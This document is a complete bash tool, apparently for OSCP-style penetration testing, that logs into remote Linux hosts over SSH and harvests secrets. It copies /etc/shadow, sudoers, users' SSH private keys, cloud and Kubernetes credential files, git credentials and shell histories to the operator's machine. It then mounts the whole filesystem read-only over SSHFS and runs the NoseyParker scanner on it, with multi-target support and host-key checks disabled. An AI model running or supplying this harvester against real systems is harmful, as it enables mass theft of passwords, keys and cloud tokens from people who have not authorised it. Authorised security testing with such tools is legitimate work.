#!/bin/bash
# =============================================================================
# ssh_linux_secrets_scan.sh — Remote Linux Secrets Scanner via SSHFS + NoseyParker
#
# Usage:
#   ./ssh_linux_secrets_scan.sh -t TARGET_IP -u USERNAME [options]
#
# Examples:
#   # Password auth
#   ./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -p 'P@ssw0rd'
#
#   # Key auth
#   ./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa
#
#   # Key auth, custom port, custom output dir
#   ./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa -P 2222 -o /tmp/results
#
#   # Quick mode — only scan high-value dirs (faster)
#   ./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa --quick
#
#   # Full scan — everything except /proc /sys /dev
#   ./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa --full
#
#   # Scan multiple targets from a file
#   ./ssh_linux_secrets_scan.sh --target-file targets.txt -u root -k ~/.ssh/id_rsa
#
# Requirements:
#   sudo apt install sshfs sshpass       (mount + password auth)
#   cargo install noseyparker            (or download binary from GitHub releases)
#   https://github.com/praetorian-inc/noseyparker
# =============================================================================

set -euo pipefail

# =============================================================================
# COLOURS & LOGGING
# =============================================================================
RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
MAG='\033[0;35m'
NC='\033[0m'

log_info()  { echo -e "${BLU}[*]${NC} $1"; }
log_ok()    { echo -e "${GRN}[+]${NC} $1"; }
log_warn()  { echo -e "${YLW}[!]${NC} $1"; }
log_err()   { echo -e "${RED}[-]${NC} $1"; }
log_sec()   { echo -e "\n${CYN}[>>]${NC} ${CYN}$1${NC}"; }
log_hit()   { echo -e "${MAG}[!!]${NC} $1"; }

# =============================================================================
# DEFAULTS
# =============================================================================
TARGET=""
TARGET_FILE=""
SSH_USER=""
SSH_PASS=""
SSH_KEY=""
SSH_PORT=22
OUTPUT_BASE="./secrets_scan_$(date +%Y%m%d_%H%M%S)"
SCAN_MODE="targeted"        # targeted | quick | full
KEEP_MOUNT=false
SKIP_NOSEYPARKER=false
NP_FORMAT="human"           # human | json | sarif
NP_BINARY="noseyparker"
THREADS=4
VERBOSE=false

# =============================================================================
# HIGH-VALUE DIRECTORIES (targeted mode)
# These are where secrets actually live on Linux boxes
# =============================================================================
TARGETED_DIRS=(
    "/home"
    "/root"
    "/etc"
    "/opt"
    "/srv"
    "/var/www"
    "/var/lib/jenkins"
    "/var/lib/gitlab"
    "/var/lib/teamcity"
    "/var/lib/drone"
    "/usr/local/etc"
    "/usr/local/bin"
    "/usr/local/share"
    "/var/backups"
)

# =============================================================================
# DIRECTORIES TO ALWAYS EXCLUDE
# =============================================================================
EXCLUDE_DIRS=(
    "/proc"
    "/sys"
    "/dev"
    "/run"
    "/snap"
    "/boot"
    "/lib"
    "/lib64"
    "/lib32"
    "/usr/lib"
    "/usr/lib64"
    "/usr/share/doc"
    "/usr/share/man"
    "/usr/share/locale"
    "/usr/share/fonts"
    "/var/cache"
    "/var/log"
    "/var/tmp"
    "/tmp"
)

# =============================================================================
# USAGE
# =============================================================================
usage() {
    echo -e """
${CYN}ssh_linux_secrets_scan.sh${NC} — Remote Linux Secrets Scanner via SSHFS + NoseyParker

${YLW}Usage:${NC}
  $0 -t TARGET -u USER [options]
  $0 --target-file FILE -u USER [options]

${YLW}Required:${NC}
  -t, --target       TARGET_IP      Target IP or hostname
  -u, --user         USERNAME       SSH username
  --target-file      FILE           File with one IP per line (multi-target mode)

${YLW}Authentication (one required):${NC}
  -p, --password     PASSWORD       SSH password (uses sshpass)
  -k, --key          PATH           SSH private key path

${YLW}Options:${NC}
  -P, --port         PORT           SSH port (default: 22)
  -o, --output       DIR            Output base directory (default: ./secrets_scan_TIMESTAMP)
  --quick                           Scan only /home /root /etc (fastest)
  --targeted                        Scan high-value dirs only (default)
  --full                            Scan entire filesystem (slow, thorough)
  --keep-mount                      Don't unmount after scan (for manual inspection)
  --no-scan                         Mount only, skip NoseyParker (manual scan)
  --format           FORMAT         NoseyParker output format: human|json|sarif (default: human)
  --threads          N              Scan threads (default: 4)
  --np-binary        PATH           Path to noseyparker binary (default: noseyparker)
  -v, --verbose                     Verbose output
  -h, --help                        Show this help

${YLW}Examples:${NC}
  $0 -t 10.10.10.50 -u root -k ~/.ssh/id_rsa
  $0 -t 10.10.10.50 -u deploy -p 'hunter2' --full
  $0 --target-file scope.txt -u root -k ~/.ssh/compromised_key --format json
"""
    exit 0
}

# =============================================================================
# ARGUMENT PARSING
# =============================================================================
[[ $# -eq 0 ]] && usage

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)        TARGET="$2";          shift 2 ;;
        --target-file)      TARGET_FILE="$2";     shift 2 ;;
        -u|--user)          SSH_USER="$2";        shift 2 ;;
        -p|--password)      SSH_PASS="$2";        shift 2 ;;
        -k|--key)           SSH_KEY="$2";         shift 2 ;;
        -P|--port)          SSH_PORT="$2";        shift 2 ;;
        -o|--output)        OUTPUT_BASE="$2";     shift 2 ;;
        --quick)            SCAN_MODE="quick";    shift ;;
        --targeted)         SCAN_MODE="targeted"; shift ;;
        --full)             SCAN_MODE="full";     shift ;;
        --keep-mount)       KEEP_MOUNT=true;      shift ;;
        --no-scan)          SKIP_NOSEYPARKER=true; shift ;;
        --format)           NP_FORMAT="$2";       shift 2 ;;
        --threads)          THREADS="$2";         shift 2 ;;
        --np-binary)        NP_BINARY="$2";       shift 2 ;;
        -v|--verbose)       VERBOSE=true;         shift ;;
        -h|--help)          usage ;;
        *) log_err "Unknown argument: $1"; usage ;;
    esac
done

# =============================================================================
# DEPENDENCY CHECKS
# =============================================================================
check_deps() {
    local missing=()

    command -v sshfs    &>/dev/null || missing+=("sshfs")
    command -v ssh      &>/dev/null || missing+=("ssh")
    command -v fusermount &>/dev/null || missing+=("fuse (fusermount)")

    if [[ -n "$SSH_PASS" ]]; then
        command -v sshpass &>/dev/null || missing+=("sshpass")
    fi

    if ! $SKIP_NOSEYPARKER; then
        command -v "$NP_BINARY" &>/dev/null || missing+=("noseyparker (set path with --np-binary)")
    fi

    if [[ ${#missing[@]} -gt 0 ]]; then
        log_err "Missing dependencies: ${missing[*]}"
        echo -e "  Install with: ${YLW}sudo apt install sshfs sshpass${NC}"
        echo -e "  NoseyParker:  ${YLW}https://github.com/praetorian-inc/noseyparker/releases${NC}"
        exit 1
    fi
}

# =============================================================================
# VALIDATE ARGS
# =============================================================================
validate_args() {
    [[ -z "$SSH_USER" ]] && { log_err "SSH user required (-u)"; exit 1; }
    [[ -z "$SSH_PASS" && -z "$SSH_KEY" ]] && { log_err "Authentication required (-p password or -k keyfile)"; exit 1; }
    [[ -n "$SSH_KEY" && ! -f "$SSH_KEY" ]] && { log_err "SSH key not found: $SSH_KEY"; exit 1; }

    if [[ "$NP_FORMAT" != "human" && "$NP_FORMAT" != "json" && "$NP_FORMAT" != "sarif" ]]; then
        log_err "Invalid format: $NP_FORMAT (use: human|json|sarif)"; exit 1
    fi
}

# =============================================================================
# BUILD SSH / SSHFS OPTIONS
# =============================================================================
build_ssh_opts() {
    local opts="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p $SSH_PORT"
    [[ -n "$SSH_KEY" ]] && opts+=" -i $SSH_KEY"
    echo "$opts"
}

build_sshfs_opts() {
    local opts="allow_other,StrictHostKeyChecking=no,UserKnownHostsFile=/dev/null,ConnectTimeout=10,port=$SSH_PORT,ro"
    [[ -n "$SSH_KEY" ]] && opts+=",IdentityFile=$SSH_KEY"
    # Increase buffer sizes for better performance over network
    opts+=",Ciphers=aes128-gcm@openssh.com,compression=no"
    echo "$opts"
}

ssh_cmd() {
    local target="$1"
    shift
    local ssh_opts
    ssh_opts=$(build_ssh_opts)
    if [[ -n "$SSH_PASS" ]]; then
        sshpass -p "$SSH_PASS" ssh $ssh_opts "$SSH_USER@$target" "$@"
    else
        ssh $ssh_opts "$SSH_USER@$target" "$@"
    fi
}

# =============================================================================
# CONNECTIVITY TEST
# =============================================================================
test_connectivity() {
    local target="$1"
    log_info "Testing SSH connectivity to $target:$SSH_PORT..."
    if ssh_cmd "$target" "echo ok" &>/dev/null; then
        log_ok "SSH connection successful"
        return 0
    else
        log_err "SSH connection failed to $target:$SSH_PORT"
        return 1
    fi
}

# =============================================================================
# GATHER TARGET INFO BEFORE MOUNTING
# =============================================================================
gather_target_info() {
    local target="$1"
    local out_dir="$2"

    log_sec "Gathering target info from $target"

    local info_file="$out_dir/target_info.txt"
    {
        echo "=== Scan Date ==="
        date

        echo "=== Target ==="
        echo "$target"

        echo "=== Hostname ==="
        ssh_cmd "$target" "hostname" 2>/dev/null

        echo "=== Whoami / ID ==="
        ssh_cmd "$target" "whoami && id" 2>/dev/null

        echo "=== OS Version ==="
        ssh_cmd "$target" "cat /etc/os-release 2>/dev/null || cat /etc/issue" 2>/dev/null

        echo "=== Kernel ==="
        ssh_cmd "$target" "uname -a" 2>/dev/null

        echo "=== Disk Usage ==="
        ssh_cmd "$target" "df -h" 2>/dev/null

        echo "=== /etc/passwd users ==="
        ssh_cmd "$target" "cat /etc/passwd" 2>/dev/null

        echo "=== Home Directories ==="
        ssh_cmd "$target" "ls -la /home/" 2>/dev/null

        echo "=== Running Services ==="
        ssh_cmd "$target" "systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null" 2>/dev/null

        echo "=== Listening Ports ==="
        ssh_cmd "$target" "ss -tlnup 2>/dev/null || netstat -tlnup 2>/dev/null" 2>/dev/null

        echo "=== Docker Presence ==="
        ssh_cmd "$target" "which docker 2>/dev/null && docker ps -a 2>/dev/null" 2>/dev/null

        echo "=== Crontabs ==="
        ssh_cmd "$target" "cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null" 2>/dev/null

    } > "$info_file" 2>&1

    log_ok "Target info saved: $info_file"
}

# =============================================================================
# MOUNT TARGET VIA SSHFS
# =============================================================================
mount_target() {
    local target="$1"
    local mount_point="$2"

    log_sec "Mounting $target:/ via SSHFS"

    mkdir -p "$mount_point"

    # Check if already mounted
    if mountpoint -q "$mount_point" 2>/dev/null; then
        log_warn "Already mounted at $mount_point — unmounting first"
        fusermount -uz "$mount_point" 2>/dev/null || sudo umount -l "$mount_point" 2>/dev/null
        sleep 1
    fi

    local sshfs_opts
    sshfs_opts=$(build_sshfs_opts)

    local sshfs_cmd="sshfs ${SSH_USER}@${target}:/ ${mount_point} -o ${sshfs_opts}"

    if [[ -n "$SSH_PASS" ]]; then
        log_info "Mounting with password auth..."
        SSHPASS="$SSH_PASS" sshfs \
            -o password_stdin \
            "${SSH_USER}@${target}:/" \
            "$mount_point" \
            -o "$sshfs_opts" <<< "$SSH_PASS"
    else
        log_info "Mounting with key auth..."
        sshfs "${SSH_USER}@${target}:/" "$mount_point" -o "$sshfs_opts"
    fi

    if mountpoint -q "$mount_point"; then
        log_ok "Mounted: $target:/ → $mount_point"
        return 0
    else
        log_err "Mount failed for $target"
        return 1
    fi
}

# =============================================================================
# UNMOUNT
# =============================================================================
unmount_target() {
    local mount_point="$1"
    if mountpoint -q "$mount_point" 2>/dev/null; then
        fusermount -u "$mount_point" 2>/dev/null || \
        fusermount -uz "$mount_point" 2>/dev/null || \
        sudo umount -l "$mount_point" 2>/dev/null
        log_ok "Unmounted: $mount_point"
    fi
    rmdir "$mount_point" 2>/dev/null || true
}

# =============================================================================
# PRE-SCAN: COLLECT HIGH-VALUE FILES DIRECTLY
# Pull known-sensitive files via SSH before NoseyParker to ensure
# they're captured even if the filesystem scan misses them
# =============================================================================
prescan_collect() {
    local target="$1"
    local out_dir="$2"
    local collected_dir="$out_dir/prescan_collected"
    mkdir -p "$collected_dir"

    log_sec "Pre-scan: Pulling known high-value files directly"

    # Function to pull a remote file if it exists
    pull_remote_file() {
        local remote_path="$1"
        local safe_name
        safe_name=$(echo "$remote_path" | tr '/' '_' | sed 's/^_//')
        local dest="$collected_dir/$safe_name"
        ssh_cmd "$target" "cat '$remote_path' 2>/dev/null" > "$dest" 2>/dev/null
        if [[ -s "$dest" ]]; then
            log_ok "Pulled: $remote_path"
        else
            rm -f "$dest"
        fi
    }

    # All users' homes from /etc/passwd
    local home_dirs
    home_dirs=$(ssh_cmd "$target" "awk -F: '\$7 !~ /nologin|false/ {print \$6}' /etc/passwd 2>/dev/null" 2>/dev/null)

    for home in $home_dirs; do
        local user
        user=$(basename "$home")
        local user_dir="$collected_dir/homes/$user"
        mkdir -p "$user_dir"

        for f in \
            ".bash_history" ".zsh_history" ".sh_history" ".mysql_history" \
            ".psql_history" ".python_history" ".git-credentials" ".gitconfig" \
            ".npmrc" ".netrc" ".pgpass" ".my.cnf" ".aws/credentials" \
            ".aws/config" ".docker/config.json" ".kube/config" \
            ".config/gcloud/application_default_credentials.json" \
            ".azure/accessTokens.json" ".azure/azureProfile.json" \
            ".vault-token" ".terraformrc" \
            ".terraform.d/credentials.tfrc.json" \
            ".config/rclone/rclone.conf" \
            ".ssh/id_rsa" ".ssh/id_ed25519" ".ssh/id_ecdsa" \
            ".ssh/config" ".ssh/known_hosts" ".ssh/authorized_keys" \
            ".config/gh/hosts.yml"; do
            pull_remote_file "$home/$f"
        done
    done

    # System files
    for f in \
        "/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" \
        "/etc/sudoers" "/etc/hosts" "/etc/resolv.conf" "/etc/fstab" \
        "/etc/exports" "/etc/crontab" \
        "/etc/mysql/my.cnf" "/etc/redis/redis.conf" \
        "/etc/nginx/nginx.conf" "/etc/apache2/apache2.conf" \
        "/etc/ssh/sshd_config" \
        "/root/.bash_history" "/root/.ssh/id_rsa" \
        "/root/.aws/credentials" "/root/.kube/config"; do
        pull_remote_file "$f"
    done

    log_ok "Pre-scan collection complete: $collected_dir"
}

# =============================================================================
# BUILD NOSEYPARKER SCAN COMMAND
# =============================================================================
build_np_scan_dirs() {
    local mount_point="$1"

    case "$SCAN_MODE" in
        quick)
            # Just the juiciest dirs
            local quick_dirs=("/home" "/root" "/etc")
            local dirs=()
            for d in "${quick_dirs[@]}"; do
                [[ -d "$mount_point$d" ]] && dirs+=("$mount_point$d")
            done
            echo "${dirs[*]}"
            ;;

        targeted)
            # High-value dirs only
            local dirs=()
            for d in "${TARGETED_DIRS[@]}"; do
                [[ -d "$mount_point$d" ]] && dirs+=("$mount_point$d")
            done
            echo "${dirs[*]}"
            ;;

        full)
            # Entire filesystem
            echo "$mount_point"
            ;;
    esac
}

build_np_excludes() {
    local mount_point="$1"
    local excludes=()

    for d in "${EXCLUDE_DIRS[@]}"; do
        excludes+=("--ignore" "$mount_point$d")
    done

    # Always exclude binary/media file extensions
    excludes+=(
        "--ignore-regex" ".*\.(jpg|jpeg|png|gif|bmp|ico|svg|webp|tiff)$"
        "--ignore-regex" ".*\.(mp3|mp4|avi|mkv|mov|wav|flac|ogg)$"
        "--ignore-regex" ".*\.(zip|gz|bz2|xz|tar|7z|rar|deb|rpm)$"
        "--ignore-regex" ".*\.(exe|dll|so|dylib|a|o|pyc|class|jar)$"
        "--ignore-regex" ".*\.(pdf|doc|docx|xls|xlsx|ppt|pptx)$"
        "--ignore-regex" ".*\.(ttf|otf|woff|woff2|eot)$"
    )

    echo "${excludes[*]}"
}

# =============================================================================
# RUN NOSEYPARKER
# =============================================================================
run_noseyparker() {
    local target="$1"
    local mount_point="$2"
    local out_dir="$3"
    local datastore="$out_dir/np_datastore"
    local safe_target="${target//./_}"

    log_sec "Running NoseyParker (mode: $SCAN_MODE)"

    # Build scan directories
    local scan_dirs
    scan_dirs=$(build_np_scan_dirs "$mount_point")

    if [[ -z "$scan_dirs" ]]; then
        log_err "No scan directories found — is the mount empty?"
        return 1
    fi

    log_info "Scan directories:"
    for d in $scan_dirs; do
        log_info "  → $d"
    done

    # Build exclude flags
    local excludes
    excludes=$(build_np_excludes "$mount_point")

    # Run NoseyParker scan
    local np_cmd="$NP_BINARY scan --datastore $datastore --jobs $THREADS"
    [[ "$VERBOSE" == true ]] && np_cmd+=" --progress"

    log_info "Starting scan (this may take a while)..."
    local scan_start
    scan_start=$(date +%s)

    # shellcheck disable=SC2086
    $NP_BINARY scan \
        --datastore "$datastore" \
        --jobs "$THREADS" \
        $excludes \
        $scan_dirs 2>&1 | tee "$out_dir/np_scan_log.txt"

    local scan_end
    scan_end=$(date +%s)
    local scan_duration=$((scan_end - scan_start))
    log_ok "Scan completed in ${scan_duration}s"

    # Generate reports
    log_info "Generating reports..."

    # Always generate human-readable
    $NP_BINARY report \
        --datastore "$datastore" \
        --format human \
        > "$out_dir/report_human.txt" 2>/dev/null
    log_ok "Human report: $out_dir/report_human.txt"

    # Always generate JSON
    $NP_BINARY report \
        --datastore "$datastore" \
        --format json \
        > "$out_dir/report.json" 2>/dev/null
    log_ok "JSON report:  $out_dir/report.json"

    # SARIF if requested
    if [[ "$NP_FORMAT" == "sarif" ]]; then
        $NP_BINARY report \
            --datastore "$datastore" \
            --format sarif \
            > "$out_dir/report.sarif" 2>/dev/null
        log_ok "SARIF report: $out_dir/report.sarif"
    fi

    # Summary stats
    local finding_count
    finding_count=$($NP_BINARY summarize --datastore "$datastore" 2>/dev/null | grep -oE '[0-9]+ finding' | head -1 || echo "unknown")
    log_ok "Findings: $finding_count"

    return 0
}

# =============================================================================
# POST-SCAN: EXTRACT HIGHLIGHTS
# Parse the NoseyParker JSON report and pull out the most critical findings
# =============================================================================
extract_highlights() {
    local out_dir="$1"
    local target="$2"
    local highlights_file="$out_dir/HIGHLIGHTS.txt"

    log_sec "Extracting highlights from report"

    {
        echo "======================================================"
        echo "  SECRETS SCAN HIGHLIGHTS"
        echo "  Target: $target"
        echo "  Date:   $(date)"
        echo "======================================================"
        echo ""

        if [[ -f "$out_dir/report_human.txt" ]]; then
            # High-priority rule names to highlight
            local high_prio_rules=(
                "AWS"
                "GCP"
                "Azure"
                "Private Key"
                "SSH"
                "password"
                "passwd"
                "secret"
                "token"
                "api.key"
                "credential"
                "database"
                "connection.string"
                "slack"
                "github"
                "gitlab"
                "stripe"
                "twilio"
                "sendgrid"
                "postgres"
                "mysql"
                "redis"
                "mongo"
            )

            for rule in "${high_prio_rules[@]}"; do
                local matches
                matches=$(grep -i "$rule" "$out_dir/report_human.txt" | head -5)
                if [[ -n "$matches" ]]; then
                    echo "--- $rule ---"
                    echo "$matches"
                    echo ""
                fi
            done
        fi

        echo "======================================================"
        echo "Full reports:"
        echo "  Human:  $out_dir/report_human.txt"
        echo "  JSON:   $out_dir/report.json"
        echo "======================================================"

    } > "$highlights_file"

    log_ok "Highlights: $highlights_file"
    echo ""
    cat "$highlights_file"
}

# =============================================================================
# ALSO SCAN THE PRE-COLLECTED FILES WITH NOSEYPARKER
# =============================================================================
scan_precollected() {
    local out_dir="$1"
    local collected_dir="$out_dir/prescan_collected"
    local datastore="$out_dir/np_prescan_datastore"

    if [[ ! -d "$collected_dir" ]] || [[ -z "$(ls -A "$collected_dir" 2>/dev/null)" ]]; then
        return
    fi

    log_sec "Running NoseyParker on pre-collected files"

    $NP_BINARY scan \
        --datastore "$datastore" \
        --jobs "$THREADS" \
        "$collected_dir" 2>&1 | tee "$out_dir/np_prescan_log.txt"

    $NP_BINARY report \
        --datastore "$datastore" \
        --format human \
        > "$out_dir/report_prescan_human.txt" 2>/dev/null

    $NP_BINARY report \
        --datastore "$datastore" \
        --format json \
        > "$out_dir/report_prescan.json" 2>/dev/null

    log_ok "Pre-scan report: $out_dir/report_prescan_human.txt"
}

# =============================================================================
# SCAN A SINGLE TARGET
# =============================================================================
scan_target() {
    local target="$1"
    local safe_target="${target//./_}"
    local out_dir="$OUTPUT_BASE/$safe_target"
    local mount_point="/mnt/.sshfs_scan_${safe_target}_$$"

    mkdir -p "$out_dir"

    echo ""
    echo -e "${CYN}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYN}║  Target: $target$(printf '%*s' $((40 - ${#target})) '')║${NC}"
    echo -e "${CYN}╚══════════════════════════════════════════════════╝${NC}"

    # Test connectivity
    if ! test_connectivity "$target"; then
        log_err "Skipping $target — SSH unreachable"
        echo "UNREACHABLE" > "$out_dir/status.txt"
        return 1
    fi

    # Gather info via SSH before mounting
    gather_target_info "$target" "$out_dir"

    # Pre-scan: pull known high-value files directly via SSH
    prescan_collect "$target" "$out_dir"

    # Mount
    if ! mount_target "$target" "$mount_point"; then
        log_err "Mount failed for $target — attempting prescan-only mode"
        # Still scan the pre-collected files
        if ! $SKIP_NOSEYPARKER; then
            scan_precollected "$out_dir"
        fi
        return 1
    fi

    # Run NoseyParker on mounted filesystem
    if ! $SKIP_NOSEYPARKER; then
        run_noseyparker "$target" "$mount_point" "$out_dir"
        scan_precollected "$out_dir"
        extract_highlights "$out_dir" "$target"
    else
        log_warn "NoseyParker scan skipped (--no-scan). Mount at: $mount_point"
    fi

    # Unmount unless --keep-mount
    if $KEEP_MOUNT; then
        log_warn "Keeping mount at $mount_point (--keep-mount)"
        echo "$mount_point" > "$out_dir/mount_point.txt"
    else
        unmount_target "$mount_point"
    fi

    log_ok "Scan complete for $target — output: $out_dir"
    echo "COMPLETE" > "$out_dir/status.txt"
}

# =============================================================================
# MAIN
# =============================================================================
check_deps
validate_args

echo -e """
${CYN}╔══════════════════════════════════════════════════════╗
║     ssh_linux_secrets_scan.sh — SSHFS + NoseyParker        ║
║     Remote Linux Secrets Scanner (OSCP Edition)      ║
╚══════════════════════════════════════════════════════╝${NC}
"""

log_info "Scan mode:     $SCAN_MODE"
log_info "Auth method:   $([[ -n "$SSH_KEY" ]] && echo "key ($SSH_KEY)" || echo "password")"
log_info "SSH port:      $SSH_PORT"
log_info "NP threads:    $THREADS"
log_info "Output dir:    $OUTPUT_BASE"
log_info "NP format:     $NP_FORMAT"

mkdir -p "$OUTPUT_BASE"

# =============================================================================
# SINGLE TARGET OR MULTI-TARGET MODE
# =============================================================================
if [[ -n "$TARGET_FILE" ]]; then
    # Multi-target mode
    if [[ ! -f "$TARGET_FILE" ]]; then
        log_err "Target file not found: $TARGET_FILE"
        exit 1
    fi

    TARGETS=()
    while IFS= read -r line; do
        line="${line//[$'\t\r\n ']}"          # strip whitespace
        [[ -z "$line" || "$line" =~ ^# ]] && continue  # skip blank/comments
        TARGETS+=("$line")
    done < "$TARGET_FILE"

    log_info "Multi-target mode: ${#TARGETS[@]} targets"

    PASS_COUNT=0
    FAIL_COUNT=0

    for t in "${TARGETS[@]}"; do
        if scan_target "$t"; then
            ((PASS_COUNT++))
        else
            ((FAIL_COUNT++))
        fi
    done

    echo ""
    log_sec "Multi-target scan complete"
    log_ok "Successful: $PASS_COUNT"
    [[ $FAIL_COUNT -gt 0 ]] && log_warn "Failed: $FAIL_COUNT"

elif [[ -n "$TARGET" ]]; then
    # Single target
    scan_target "$TARGET"

else
    log_err "No target specified. Use -t TARGET or --target-file FILE"
    usage
fi

# =============================================================================
# FINAL SUMMARY
# =============================================================================
log_sec "All scans complete"
log_ok "Results directory: $OUTPUT_BASE"
echo ""
log_info "Quick view of findings:"
echo -e "  ${YLW}cat $OUTPUT_BASE/*/report_human.txt | less${NC}"
echo -e "  ${YLW}cat $OUTPUT_BASE/*/HIGHLIGHTS.txt${NC}"
echo ""
log_info "JSON parsing (jq required):"
echo -e "  ${YLW}cat $OUTPUT_BASE/*/report.json | jq '.[] | {rule: .rule_name, file: .location, match: .snippet}'${NC}"
echo ""
log_info "Grep for specific secret types:"
echo -e "  ${YLW}grep -i 'aws\\|gcp\\|azure\\|password\\|token' $OUTPUT_BASE/*/report_human.txt${NC}"
echo ""
